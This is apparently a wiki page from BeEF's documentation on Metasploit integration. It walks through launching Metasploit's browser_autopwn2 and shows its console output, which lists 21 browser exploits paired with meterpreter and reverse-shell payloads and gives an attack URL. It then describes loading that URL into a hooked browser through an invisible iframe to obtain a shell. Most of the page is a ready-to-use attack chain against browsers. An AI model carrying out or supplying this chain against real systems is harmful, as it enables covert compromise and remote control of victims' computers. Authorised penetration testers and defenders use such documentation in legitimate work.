## Introduction

BeEF supports Metasploit integration, and only requires some simple [[configuration|Configuration]] to get up and running. Once running Metasploit modules can be run directly through the BeEF interface.

#### Table of Contents
* [Metasploit Modules](#metasploit-modules)
* [Browser Autopwn](#browser-autopwn)

## Metasploit Modules

After launching Metasploit, its modules can be found in the BeEF command modules tree:

[[Images/msf2.png|align=center]]

All regular payload CLI arguments have their own form fields in the module's interface:

[[Images/msf3.png|align=center]]

Now, sit back and wait for the exploit to work:

[[Images/msf6.png|align=center]]

## Browser Autopwn

While the feature is not directly integrated in BeEF, you can easily use the Browser Autopwn function of Metasploit with BeEF.

```
msf > use auxiliary/server/browser_autopwn2
msf auxiliary(browser_autopwn2) > show options

Module options (auxiliary/server/browser_autopwn2):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   EXCLUDE_PATTERN                   no        Pattern search to exclude specific modules
   INCLUDE_PATTERN                   no        Pattern search to include specific modules
   Retries          true             no        Allow the browser to retry the module
   SRVHOST          0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT          8080             yes       The local port to listen on.
   SSL              false            no        Negotiate SSL for incoming connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                           no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer  Start a bunch of modules and direct clients to appropriate exploits

```

First, launch browser_autopwn or browser_autopwn2 in Metasploit and get the BrowserAutoPwn URL, for example:

```
msf auxiliary(browser_autopwn2) > run -z 
[*] Auxiliary module execution completed

[*] Searching BES exploits, please wait...
msf auxiliary(browser_autopwn2) >
[*] Starting exploit modules...
[*] Starting listeners...
[*] Time spent: 6.01071043
[*] Using URL: http://0.0.0.0:8080/5WNrYZjr
[*] Local IP: http://10.1.1.175:8080/5WNrYZjr

[*] The following is a list of exploits that BrowserAutoPwn will consider using.
[*] Exploits with the highest ranking and newest will be tried first.

Exploits
========

 Order  Rank       Name                                       Payload
 -----  ----       ----                                       -------
 1      Excellent  webview_addjavascriptinterface             android/meterpreter/reverse_tcp on 4443
 2      Excellent  samsung_knox_smdm_url                      android/meterpreter/reverse_tcp on 4443
 3      Excellent  firefox_svg_plugin                         firefox/shell_reverse_tcp on 4442
 4      Excellent  firefox_webidl_injection                   firefox/shell_reverse_tcp on 4442
 5      Excellent  firefox_tostring_console_injection         firefox/shell_reverse_tcp on 4442
 6      Excellent  firefox_proto_crmfrequest                  firefox/shell_reverse_tcp on 4442
 7      Great      adobe_flash_net_connection_confusion       windows/meterpreter/reverse_tcp on 4444
 8      Great      adobe_flash_shader_drawing_fill            windows/meterpreter/reverse_tcp on 4444
 9      Great      adobe_flash_shader_job_overflow            windows/meterpreter/reverse_tcp on 4444
 10     Great      adobe_flash_hacking_team_uaf               windows/meterpreter/reverse_tcp on 4444
 11     Great      adobe_flash_uncompress_zlib_uaf            windows/meterpreter/reverse_tcp on 4444
 12     Great      adobe_flash_opaque_background_uaf          windows/meterpreter/reverse_tcp on 4444
 13     Great      adobe_flash_pixel_bender_bof               windows/meterpreter/reverse_tcp on 4444
 14     Great      adobe_flash_nellymoser_bof                 windows/meterpreter/reverse_tcp on 4444
 15     Great      adobe_flash_copy_pixels_to_byte_array      windows/meterpreter/reverse_tcp on 4444
 16     Great      adobe_flash_worker_byte_array_uaf          windows/meterpreter/reverse_tcp on 4444
 17     Great      adobe_flash_casi32_int_overflow            windows/meterpreter/reverse_tcp on 4444
 18     Great      adobe_flash_domain_memory_uaf              windows/meterpreter/reverse_tcp on 4444
 19     Good       adobe_flash_uncompress_zlib_uninitialized  windows/meterpreter/reverse_tcp on 4444
 20     Good       wellintech_kingscada_kxclientdownload      windows/meterpreter/reverse_tcp on 4444
 21     Good       ms14_064_ole_code_execution                windows/meterpreter/reverse_tcp on 4444

[+] Please use the following URL for the browser attack:
[+] BrowserAutoPwn URL: http://10.1.1.175:8080/5WNrYZjr
[*] Server started.
[*] Starting the payload handler...
```

Note the BrowserAutoPwn URL: `http://10.1.1.175:8080/5WNrYZjr`

Then use the "Create Invisible Iframe" command module to load the autopwn webpage in an iframe:

[[Images/msf8.png|align=center]]

You just have to wait for a shell :

[[Images/msf9.png|align=center]]

***

[[Previous|Network-discovery]] | [[Next|Tunneling]] 